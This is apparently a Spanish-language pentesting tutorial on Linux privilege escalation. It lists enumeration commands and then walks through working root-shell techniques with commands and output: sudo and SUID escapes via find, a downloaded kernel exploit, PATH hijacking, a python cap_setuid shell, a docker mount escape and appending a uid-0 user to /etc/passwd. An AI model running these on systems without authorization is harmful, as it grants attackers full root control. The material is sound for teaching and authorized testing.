💡 ¿Qué es el Escalamiento de Privilegios?
Es la fase de post-explotación donde elevas tus permisos en un sistema comprometido, pasando de usuario limitado a root (Linux) o SYSTEM (Windows). Es una técnica legítima en pentesting autorizado para evaluar la profundidad de una brecha.
↗️ Vertical
De usuario normal a administrador/root. Es el objetivo más común en pentesting.
Común
↔️ Horizontal
De un usuario a otro con el mismo nivel de privilegios. Útil para pivotar entre cuentas.
Táctico
📋 Flujo de Trabajo Típico
  • 1 Compromiso inicial (shell como usuario limitado)
  • 2 Enumeración del sistema y del entorno
  • 3 Identificación de vectores de escalamiento
  • 4 Explotación del vector identificado
  • 5 Estabilización y persistencia (si aplica)

🔍 Enumeración del Sistema
La enumeración es el 90% del escalamiento. Sin información, no hay exploit.
🖥️ Información del Sistema y Kernel ▼
$ uname -a Linux target 5.15.0-105-generic #115-Ubuntu SMP ... x86_64 GNU/Linux $ cat /etc/os-release PRETTY_NAME="Ubuntu 22.04.4 LTS" $ hostnamectl $ dpkg -l | grep linux-image # Busca versiones antiguas del kernel. Usa searchsploit o linux-exploit-suggester
👤 Usuarios, Grupos y Permisos ▼
$ id && whoami && groups $ cat /etc/passwd | grep -v nologin | grep -v false $ sudo -l User www-data may run the following commands on target: (root) NOPASSWD: /usr/bin/python3
sudo -l es CRÍTICO. Si ves NOPASSWD, verifica en GTFOBins cómo escalar.
⚙️ Procesos, Servicios y Cron ▼
$ ps aux $ ps -ef | grep root $ systemctl list-units --type=service $ crontab -l $ cat /etc/crontab && ls -la /etc/cron.* $ find /etc/cron* -type f -perm -o+w 2>/dev/null # Busca cron jobs como root con scripts editables por ti
🔐 Archivos SUID, SGID y Sticky ▼
$ find / -perm -4000 -type f 2>/dev/null $ find / -perm -2000 -type f 2>/dev/null $ find / -perm -2 -type f 2>/dev/null $ find / -writable -type d 2>/dev/null | grep -v proc
Archivos SUID ejecutan con permisos del propietario. Si es root, puedes escalar. Verifica en GTFOBins.
🌐 Red, Variables de Entorno y Capacidades ▼
$ ip a && netstat -tulpn 2>/dev/null || ss -tulpn $ env | grep -i path $ getcap -r / 2>/dev/null /usr/bin/python3 = cap_setuid+ep
Las capabilities son permisos granulares. cap_setuid permite cambiar el UID — vector de escalamiento directo.
🎯 Técnicas Principales de Escalamiento
Selecciona una técnica para ver el exploit paso a paso.
1️⃣ Sudo Abuse / GTFOBins Fácil ▼
Si sudo -l muestra que puedes ejecutar un binario como root sin contraseña:
$ sudo -l (root) NOPASSWD: /usr/bin/find $ sudo find . -exec /bin/sh \; -quit # whoami root
Otros comunes: vim, less, python3, bash, awk, nano. Consulta GTFOBins para cada uno.
2️⃣ SUID Binaries Medio ▼
Binarios con bit SUID que ejecutan como root:
$ ls -la /usr/bin/find -rwsr-xr-x 1 root root ... /usr/bin/find $ /usr/bin/find . -exec /bin/sh -p \; -quit # id uid=0(root) gid=0(root)
El flag -p preserva los permisos efectivos del SUID.
3️⃣ Kernel Exploits Avanzado ▼
Cuando el kernel es antiguo y tiene CVEs conocidas:
$ uname -r 5.15.0-50-generic $ searchsploit linux kernel 5.15 $ linux-exploit-suggester $ wget [exploit.c] -O exploit.c $ gcc exploit.c -o exploit $ ./exploit # whoami root
⚠️ Compilar en el target puede fallar. Trae binarios precompilados o compila estáticamente: gcc -static.
4️⃣ PATH Hijacking Medio ▼
Si un script root ejecuta un comando sin ruta absoluta:
$ cat /usr/local/bin/backup.sh #!/bin/bash cd /home/user tar czf /backups/user.tar.gz * $ echo '/bin/bash' > /tmp/tar $ chmod +x /tmp/tar $ export PATH=/tmp:$PATH $ /usr/local/bin/backup.sh # whoami root
5️⃣ Capabilities (cap_setuid) Medio ▼
$ getcap /usr/bin/python3 /usr/bin/python3 = cap_setuid+ep $ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")' # id uid=0(root)
6️⃣ Docker / LXC Escape Avanzado ▼
$ id uid=1000(user) gid=999(docker) $ docker run -v /:/mnt -it alpine chroot /mnt sh # whoami root
Pertenecer al grupo docker es equivalente a root. También busca sockets accesibles: /var/run/docker.sock.
7️⃣ Writable /etc/passwd o /etc/sudoers Fácil ▼
$ openssl passwd -1 hacker $1$xyz$abc123... $ echo 'hacker:$1$xyz$abc123...:0:0::/root:/bin/bash' >> /etc/passwd $ su hacker # whoami root
